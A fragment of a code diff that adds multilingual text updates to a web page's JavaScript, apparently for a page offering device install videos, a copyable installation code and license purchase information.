+            
+            const t = translations[lang] || translations.en;
+            
+            console.log('🎨 Applying language translations for: ' + lang.toUpperCase());
+            
+            // Update all translatable elements
+            updateText('mainTitle', t.title);
+            updateText('mainSubtitle', t.subtitle);
+            updateText('needSupportText', t.needSupport);
+            
+            updateText('androidTitle', t.androidTitle);
+            updateText('androidDesc', t.androidDesc);
+            updateText('pcTitle', t.pcTitle);
+            updateText('pcDesc', t.pcDesc);
+            updateText('iphoneTitle', t.iphoneTitle);
+            updateText('iphoneDesc', t.iphoneDesc);
+            
+            updateText('downloadCodeTitle', t.downloadCode);
+            updateText('downloadCodeDesc', t.downloadCodeDesc);
+            updateText('getCodeBtn', t.getCode);
+            
+            // Video page titles
+            updateText('androidVideoTitle', t.androidVideoTitle);
+            updateText('androidVideoDesc', t.androidVideoDesc);
+            updateText('pcVideoTitle', t.pcVideoTitle);
+            updateText('pcVideoDesc', t.pcVideoDesc);
+            updateText('iphoneVideoTitle', t.iphoneVideoTitle);
+            updateText('iphoneVideoDesc', t.iphoneVideoDesc);
+            
+            // Code page
+            updateText('installationCodeTitle', t.installationCode);
+            updateText('installCodeDesc', t.installCodeDesc);
+            updateText('quickInstallText', t.quickInstall);
+            updateText('dragInfoText', t.dragInfo);
+            updateText('purchaseLicenseTitle', t.purchaseLicense);
+            updateText('importantNoticeText', t.importantNotice);
+            updateText('licenseInfoText', t.licenseInfo);
+            updateText('onlyBuyText', t.onlyBuy);
+            updateText('avoidScamText', t.avoidScam);
+            updateText('licensePriceText', t.licensePrice);
+            updateText('contactDeveloperText', t.contactDeveloper);
+            updateText('instantDeliveryText', t.instantDelivery);
+            
+            // Update all buttons
+            updateAllButtons('watchVideoBtn', t.watchVideo);
+            updateAllButtons('backToHomeBtn', t.backToHome);
+            updateAllButtons('copyCodeBtn', t.copyCode);
+            updateAllButtons('watchInstallBtn', t.watchInstall);
+        }
+
+        function updateText(className, text) {
+            const elements = document.querySelectorAll(`.${className}`);
+            elements.forEach(el => {
+                if (el) el.textContent = text;
+            });
+        }
+
+        function updateAllButtons(className, text) {
+            const buttons = document.querySelectorAll(`.${className}`);
+            buttons.forEach(btn => {
+                const span = btn.querySelector('span');
+                if (span) span.textContent = text;
+            });
+        }
+
+        // Initialize language detection on page load
+        detectLanguage();
 
 
         // Simulate loading for smooth transition
@@ -987,7 +1417,8 @@
                 document.execCommand('copy');
                 const btn = event.target.closest('.btn-copy');
                 const originalHTML = btn.innerHTML;
-                btn.innerHTML = '<i class="fas fa-check"></i> <span>Copied Successfully!</span>';
+                const t = translations[currentLang] || translations.en;
+                btn.innerHTML = '<i class="fas fa-check"></i> <span>' + t.copiedSuccess + '</span>';
                 btn.style.background = 'linear-gradient(135deg, #06ffa5, #00d4aa)';
                 
                 setTimeout(() => {
